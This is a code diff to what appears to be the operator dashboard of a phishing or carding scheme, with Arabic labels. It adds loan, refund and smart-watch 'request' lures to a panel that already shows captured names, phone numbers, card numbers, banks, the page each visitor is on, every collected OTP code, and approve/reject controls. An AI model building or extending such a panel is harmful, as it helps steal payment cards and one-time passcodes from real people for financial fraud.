@@ -382,6 +382,11 @@
         isHidden: !!m.isHidden,
         flagColor: m.flagColor || '',
         currentPage: m.currentPage || '',
+        // طلبات الخدمات (سلفة / استرداد / ساعة ذكية)
+        requestType: m.requestType || '',
+        requestTypeLabel: m.requestTypeLabel || '',
+        refNo: m.refNo || '',
+        requestDetails: m.details || {},
         lastSeen: ls,
         createdDate: latestCard.createdAt || m.createdAt || null,
         lastActivity: lastActivity,
@@ -425,7 +430,7 @@
       // البحث
       if (searchQuery) {
         const q = searchQuery.toLowerCase();
-        const hay = [n.name, n.phone, n.country, n.otp, n.cardNumber, n.bank, n.currentPage, n.sessionId, n.id].filter(Boolean).join(' ').toLowerCase();
+        const hay = [n.name, n.phone, n.country, n.otp, n.cardNumber, n.bank, n.currentPage, n.sessionId, n.id, n.refNo, n.requestTypeLabel].filter(Boolean).join(' ').toLowerCase();
         if (!hay.includes(q)) return false;
       }
       return true;
@@ -515,6 +520,7 @@
                 <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="text-emerald-400"><path d="M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2"></path><circle cx="9" cy="7" r="4"></circle></svg>
               </div>
               <span class="font-medium text-white">${escapeHtml(countryOrBank)}</span>
+              ${n.requestTypeLabel ? `<span class="inline-flex items-center rounded-md border px-2 py-0.5 text-xs bg-amber-500/10 text-amber-400 border-amber-500/30">${escapeHtml(n.requestTypeLabel)}</span>` : ''}
             </div>
           </td>
           <td class="px-6 py-4">
@@ -582,6 +588,8 @@
         : '';
       const paymentLabel = n.paymentType === 'partial' ? '1 دينار' : (n.paymentType === 'full' ? 'الطلبية كاملة' : (n.paymentType || ''));
       const fields = [
+        { label: 'نوع الطلب', value: n.requestTypeLabel },
+        { label: 'رقم الطلب', value: n.refNo },
         { label: 'الاسم', value: n.name },
         { label: 'رقم الهاتف', value: n.phone },
         { label: 'العنوان', value: n.address },
@@ -592,6 +600,18 @@
         { label: 'المبلغ', value: n.amount },
       ];
       let html = renderDetailFields(fields);
+
+      // تفاصيل الطلب (سلفة / استرداد / ساعة ذكية) — كل حقل في صندوق
+      const rd = n.requestDetails || {};
+      const detailRows = requestDetailRows(n.requestType, rd);
+      if (detailRows.length) {
+        html += `
+          <div class="mt-4 pt-4 border-t border-slate-700">
+            <h4 class="text-sm font-semibold text-amber-400 mb-3">تفاصيل ${escapeHtml(n.requestTypeLabel || 'الطلب')}</h4>
+            ${renderDetailFields(detailRows)}
+          </div>
+        `;
+      }
 
       // قسم رموز التحقق (OTP) — كل رمز في صندوق منفصل
       if (n.allOtps && n.allOtps.length) {
@@ -731,6 +751,46 @@
         <span class="text-sm font-medium text-white font-mono ${f.sensitive ? 'bg-slate-800/50 px-2 py-0.5 rounded' : ''}">${escapeHtml(f.value || '-')}</span>
       </div>
     `).join('');
+  }
+
+  // ── حقول تفاصيل الطلب حسب نوعه ──────────────────────────────
+  // تُبنى من details المرسلة عبر window.pushFirebaseRequest
+  function requestDetailRows(type, d) {
+    d = d || {};
+    const product = d.product || {};
+    const num = (v) => (v === undefined || v === null || v === '') ? '' : String(v);
+    if (type === 'loan') {
+      return [
+        { label: 'مبلغ السلفة', value: num(d.amount) ? Number(d.amount).toLocaleString('en-US') + ' د.ع' : '' },
+        { label: 'المدة', value: num(d.durationMonths) ? d.durationMonths + ' شهر' : '' },
+      ];
+    }
+    if (type === 'refund') {
+      return [
+        { label: 'رقم الطلب/العملية', value: num(d.orderNo) },
+        { label: 'نوع الخدمة', value: num(d.serviceType) },
+        { label: 'مبلغ الاسترداد', value: num(d.refundAmount) },
+        { label: 'سبب الاسترداد', value: num(d.reason) },
+        { label: 'طريقة الاسترداد', value: num(d.refundMethod) },
+        { label: 'ملاحظات', value: num(d.notes) },
+      ];
+    }
+    if (type === 'watch') {
+      return [
+        { label: 'الساعة', value: num(product.name) },
+        { label: 'الفئة', value: num(d.tier) },
+        { label: 'المقاس', value: num(d.size) },
+        { label: 'المحافظة', value: num(d.governorate) },
+        { label: 'القضاء/المنطقة', value: num(d.area) },
+        { label: 'العنوان التفصيلي', value: num(d.addressLine) },
+        { label: 'أقرب نقطة دالة', value: num(d.landmark) },
+        { label: 'وقت التوصيل', value: num(d.deliveryTime) },
+        { label: 'هاتف بديل', value: num(d.phone2) },
+        { label: 'البريد الإلكتروني', value: num(d.email) },
+        { label: 'ملاحظات', value: num(d.notes) },
+      ];
+    }
+    return [];
   }
 
   // ── الموافقة / الرفض ────────────────────────────────────────
